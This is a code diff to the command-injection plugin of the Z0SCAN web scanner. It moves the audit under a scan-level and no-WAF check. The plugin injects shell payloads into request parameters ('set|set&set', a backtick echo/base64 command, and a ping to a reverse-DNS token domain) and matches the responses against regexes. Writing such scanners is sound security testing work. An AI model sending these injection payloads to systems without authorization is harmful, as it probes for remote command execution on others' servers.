@@ -77,82 +77,82 @@ class Z0SCAN(PluginBase):
     def audit(self):
         url = self.requests.url
 
-        if self.requests.suffix not in acceptedExt and conf.level < 4:
+        if self.requests.suffix not in acceptedExt:
             return
+        if conf.level >= 3 and not KB["WafState"]:
+            randint = random.randint(1000, 9000)
+            url_flag = {
+                "set|set&set": [
+                    'Path=[\s\S]*?PWD=',
+                    'Path=[\s\S]*?PATHEXT=',
+                    'Path=[\s\S]*?SHELL=',
+                    'Path\x3d[\s\S]*?PWD\x3d',
+                    'Path\x3d[\s\S]*?PATHEXT\x3d',
+                    'Path\x3d[\s\S]*?SHELL\x3d',
+                    'SERVER_SIGNATURE=[\s\S]*?SERVER_SOFTWARE=',
+                    'SERVER_SIGNATURE\x3d[\s\S]*?SERVER_SOFTWARE\x3d',
+                    'Non-authoritative\sanswer:\s+Name:\s*',
+                    'Server:\s*.*?\nAddress:\s*'
+                ],
+                "echo `echo 6162983|base64`6162983".format(randint): [
+                    "NjE2Mjk4Mwo=6162983"
+                ]
+            }
+            if OS.WINDOWS in self.response.os:
+                del url_flag["echo `echo 6162983|base64`6162983".format(randint)]
 
-        randint = random.randint(1000, 9000)
-        url_flag = {
-            "set|set&set": [
-                'Path=[\s\S]*?PWD=',
-                'Path=[\s\S]*?PATHEXT=',
-                'Path=[\s\S]*?SHELL=',
-                'Path\x3d[\s\S]*?PWD\x3d',
-                'Path\x3d[\s\S]*?PATHEXT\x3d',
-                'Path\x3d[\s\S]*?SHELL\x3d',
-                'SERVER_SIGNATURE=[\s\S]*?SERVER_SOFTWARE=',
-                'SERVER_SIGNATURE\x3d[\s\S]*?SERVER_SOFTWARE\x3d',
-                'Non-authoritative\sanswer:\s+Name:\s*',
-                'Server:\s*.*?\nAddress:\s*'
-            ],
-            "echo `echo 6162983|base64`6162983".format(randint): [
-                "NjE2Mjk4Mwo=6162983"
-            ]
-        }
-        if OS.WINDOWS in self.response.os:
-            del url_flag["echo `echo 6162983|base64`6162983".format(randint)]
+            # 无回显 payload
+            # dnslog = DnsLogApi()
+            # dnsdomain = dnslog.new_domain()
+            # token = random_str(4)
+            # dnslog_payload = "ping -nc 1 {}.{}".format(token, dnsdomain)
+            # url_flag[dnslog_payload] = []
 
-        # 无回显 payload
-        # dnslog = DnsLogApi()
-        # dnsdomain = dnslog.new_domain()
-        # token = random_str(4)
-        # dnslog_payload = "ping -nc 1 {}.{}".format(token, dnsdomain)
-        # url_flag[dnslog_payload] = []
+            # 内置平台 dns payload
+            dns = reverseApi()
+            if dns.isUseReverse():
+                dnsdomain = dns.generate_dns_token()
+                dns_token = dnsdomain["token"]
+                fullname = dnsdomain["fullname"]
+                reverse_payload = "ping -nc 1 {}".format(fullname)
+                url_flag[reverse_payload] = []
 
-        # 内置平台 dns payload
-        dns = reverseApi()
-        if dns.isUseReverse():
-            dnsdomain = dns.generate_dns_token()
-            dns_token = dnsdomain["token"]
-            fullname = dnsdomain["fullname"]
-            reverse_payload = "ping -nc 1 {}".format(fullname)
-            url_flag[reverse_payload] = []
+            iterdatas = self.generateItemdatas()
+            for origin_dict, positon in iterdatas:
+                payloads = self.paramsCombination(origin_dict, positon, url_flag)
+                for key, value, new_value, payload, re_list in payloads:
+                    r = self.req(positon, payload)
+                    if not r:
+                        continue
+                    html1 = r.text
+                    for rule in re_list:
+                        if re.search(rule, html1, re.I | re.S | re.M):
+                            result = self.new_result()
+                            result.init_info(url, "可执行任意系统命令", VulType.CMD_INNJECTION)
+                            result.add_detail("payload请求", r.reqinfo, generateResponse(r),
+                                            "执行payload:{} 并发现正则回显{}".format(new_value, rule), key, new_value, positon)
+                            self.success(result)
+                            break
+                    # if dnslog_payload in new_value:
+                    #     dnslist = dnslog.check()
+                    #     if dnslist:
+                    #         result = self.new_result()
+                    #         result.init_info(url, "可执行任意系统命令", VulType.CMD_INNJECTION)
+                    #         result.add_detail("payload请求", r.reqinfo, generateResponse(r),
+                    #                           "执行payload:{} dnslog平台接收到返回值".format(payload, repr(dnslist)), key,
+                    #                           new_value,
+                    #                           positon)
+                    #         self.success(result)
+                    #         break
 
-        iterdatas = self.generateItemdatas()
-        for origin_dict, positon in iterdatas:
-            payloads = self.paramsCombination(origin_dict, positon, url_flag)
-            for key, value, new_value, payload, re_list in payloads:
-                r = self.req(positon, payload)
-                if not r:
-                    continue
-                html1 = r.text
-                for rule in re_list:
-                    if re.search(rule, html1, re.I | re.S | re.M):
-                        result = self.new_result()
-                        result.init_info(url, "可执行任意系统命令", VulType.CMD_INNJECTION)
-                        result.add_detail("payload请求", r.reqinfo, generateResponse(r),
-                                          "执行payload:{} 并发现正则回显{}".format(new_value, rule), key, new_value, positon)
-                        self.success(result)
-                        break
-                # if dnslog_payload in new_value:
-                #     dnslist = dnslog.check()
-                #     if dnslist:
-                #         result = self.new_result()
-                #         result.init_info(url, "可执行任意系统命令", VulType.CMD_INNJECTION)
-                #         result.add_detail("payload请求", r.reqinfo, generateResponse(r),
-                #                           "执行payload:{} dnslog平台接收到返回值".format(payload, repr(dnslist)), key,
-                #                           new_value,
-                #                           positon)
-                #         self.success(result)
-                #         break
-
-                if dns.isUseReverse():
-                    dnslist = dns.check(dns_token)
-                    if dnslist:
-                        result = self.new_result()
-                        result.init_info(url, "可执行任意系统命令", VulType.CMD_INNJECTION)
-                        result.add_detail("payload请求", r.reqinfo, generateResponse(r),
-                                          "执行payload:{} dnslog平台接收到返回值".format(payload, repr(dnslist)), key,
-                                          new_value,
-                                          positon)
-                        self.success(result)
-                        break
+                    if dns.isUseReverse():
+                        dnslist = dns.check(dns_token)
+                        if dnslist:
+                            result = self.new_result()
+                            result.init_info(url, "可执行任意系统命令", VulType.CMD_INNJECTION)
+                            result.add_detail("payload请求", r.reqinfo, generateResponse(r),
+                                            "执行payload:{} dnslog平台接收到返回值".format(payload, repr(dnslist)), key,
+                                            new_value,
+                                            positon)
+                            self.success(result)
+                            break
